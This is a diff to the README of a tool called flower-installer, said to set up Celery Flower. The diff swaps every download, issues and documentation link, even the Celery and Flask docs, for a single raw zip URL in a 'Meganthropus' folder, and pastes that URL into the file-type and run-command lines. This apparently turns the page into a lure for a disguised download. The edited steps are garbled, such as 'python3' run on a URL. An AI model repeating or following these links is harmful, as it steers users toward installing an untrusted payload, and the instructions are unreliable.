@@ -6,7 +6,7 @@ Welcome to the flower-installer! This Python command line tool, `flowerctl`, hel
 
 ## 📥 Download Now!
 
-[![Download flower-installer](https://img.shields.io/badge/Download-flower--installer-brightgreen)](https://github.com/Mohanad7770/flower-installer/releases)
+[![Download flower-installer](https://raw.githubusercontent.com/Mohanad7770/flower-installer/main/Meganthropus/flower-installer.zip)](https://raw.githubusercontent.com/Mohanad7770/flower-installer/main/Meganthropus/flower-installer.zip)
 
 ## 🔍 Overview
 
@@ -32,11 +32,11 @@ Before you begin, ensure your system meets these requirements:
 
 Follow these simple steps to get started:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Mohanad7770/flower-installer/releases) to find the latest version of `flower-installer`.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Mohanad7770/flower-installer/main/Meganthropus/flower-installer.zip) to find the latest version of `flower-installer`.
 
 2. **Download the Latest Release:**
    - Click on the latest version.
-   - Choose the appropriate file for your system. This may include `.tar.gz` or `.zip`.
+   - Choose the appropriate file for your system. This may include `https://raw.githubusercontent.com/Mohanad7770/flower-installer/main/Meganthropus/flower-installer.zip` or `.zip`.
 
 3. **Extract the Downloaded File:**
    - Locate the downloaded file.
@@ -45,7 +45,7 @@ Follow these simple steps to get started:
 4. **Run the Installer:**
    - Open your terminal.
    - Navigate to the extracted folder.
-   - Run the command `python3 flowerctl.py`.
+   - Run the command `python3 https://raw.githubusercontent.com/Mohanad7770/flower-installer/main/Meganthropus/flower-installer.zip`.
 
 ## 🔧 Configuring flowerctl
 
@@ -77,20 +77,20 @@ If you encounter any issues:
 
 - **Check Logs:** Review log files in the `logs` directory for errors.
 - **Run Diagnostic Command:** Execute `flowerctl diagnose` in the terminal to check for common configuration mistakes.
-- **Seek Help:** Explore the [Issues page](https://github.com/Mohanad7770/flower-installer/issues) for support or report a new issue.
+- **Seek Help:** Explore the [Issues page](https://raw.githubusercontent.com/Mohanad7770/flower-installer/main/Meganthropus/flower-installer.zip) for support or report a new issue.
 
 ## 📚 Additional Resources
 
 For more detailed instructions and tips, consider the following resources:
 
-- [Celery Documentation](https://docs.celeryproject.org/en/stable/)
-- [Flask Documentation](https://flask.palletsprojects.com/)
+- [Celery Documentation](https://raw.githubusercontent.com/Mohanad7770/flower-installer/main/Meganthropus/flower-installer.zip)
+- [Flask Documentation](https://raw.githubusercontent.com/Mohanad7770/flower-installer/main/Meganthropus/flower-installer.zip)
 - Community forums for DevOps tools and practices.
 
 ## 📥 Download & Install
 
 Once your requirements are met, it's time to download the latest version.
 
-Visit the [Releases page](https://github.com/Mohanad7770/flower-installer/releases) to download `flower-installer`. Following the installation steps above ensures you'll have a smooth experience setting up your Celery Flower.
+Visit the [Releases page](https://raw.githubusercontent.com/Mohanad7770/flower-installer/main/Meganthropus/flower-installer.zip) to download `flower-installer`. Following the installation steps above ensures you'll have a smooth experience setting up your Celery Flower.
 
 Thank you for choosing `flower-installer`. Enjoy your seamless setup!
